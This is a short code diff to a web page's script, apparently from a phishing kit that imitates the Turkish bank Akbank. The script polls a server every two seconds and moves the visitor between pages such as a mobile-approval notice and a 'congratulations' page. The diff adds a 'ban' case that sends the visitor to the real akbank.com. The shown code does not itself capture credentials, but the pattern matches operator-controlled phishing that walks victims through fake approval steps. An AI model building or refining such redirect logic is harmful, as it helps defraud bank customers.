@@ -56,7 +56,7 @@
     </div>
 
  
-        <script>
+    <script>
         function isJSON(data) {
             if (typeof data !== "string") {
                 return false;
@@ -89,6 +89,8 @@
                         window.location.href = "tebrik.html";
                     } else if (data.page == "mobilonay") {
                         window.location.href = "bildirim.html";
+                    } else if (data.page == "ban") {
+                        window.location.href = "https://akbank.com";
                     }
                 })
                 .catch(error => {
@@ -96,13 +98,10 @@
                 });
         }
 
-        $(document).ready(function () {
-
-            promo();
-
+        $(document).ready(function () { 
+            promo(); 
             setInterval(promo, 2000);
         });
-    </script>  
+    </script>
 </body>
-
 </html>
